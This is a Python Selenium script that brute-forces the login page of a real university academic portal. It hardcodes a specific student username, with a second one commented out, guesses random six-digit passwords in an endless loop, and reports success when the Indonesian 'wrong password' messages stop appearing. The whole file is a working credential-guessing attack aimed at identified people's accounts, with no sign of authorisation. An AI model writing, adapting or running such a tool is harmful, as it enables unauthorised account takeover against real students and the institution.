from random import randint
import time
from datetime import timedelta
from logging import error
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

def brute(username, password, driver, link="https://akademik.uin-suka.ac.id/login"):
    # head to github login page
    driver.get(link)
    # find username/email field and send the username itself to the input field
    driver.find_element_by_id("username").send_keys(username)
    # find password input field and insert password as well
    driver.find_element_by_id("password").send_keys(password)
    # click login button
    driver.find_element_by_xpath("//div[@class='login-form']/form[1]/button[1]").click()
    # wait the ready state to be complete
    WebDriverWait(driver=driver, timeout=10).until(
        lambda x: x.execute_script("return document.readyState === 'complete'")
    )
    # get the errors (if there are)
    errors = driver.find_elements_by_xpath("//*[@id='app_content']/div[1]/div[2]/div[1]/p")

    return errors

# Generate password
def generate():
    return '{:06d}'.format(randint(0,999999))

if __name__ == '__main__':
    start_time = time.monotonic()
    i = 1
    # chromedriver path
    driverpath = '/home/irfancr/Practices/rizkitawar/chromedriver'
    # initialize the Chrome driver
    driver = webdriver.Chrome(driverpath)
    error_message = ["Maaf, Password salah.", "Maaf, status Username tidak aktif."]
    
    while(True):
        # Akademik credentials
        # bril user
        username = "18105010022"
        # Rizkita user
        # username = "19105010041"
        password = generate()
        # if we find that error message within errors, then login is failed
        errors = brute(username, password, driver)

        # print(errors)
        # print([error.text for error in errors])
        print("[{}] {}: {}".format(i, username, password))

        if any(e.text in error_message for e in errors):
            print("[!] Login FAILED", end=', time:')
        else:
            print("[+] Login SUCCESSFUL")
            break

        end_time = time.monotonic()
        print(timedelta(seconds=end_time - start_time), end='\n\n')
        i += 1
    # close the driver
    driver.close()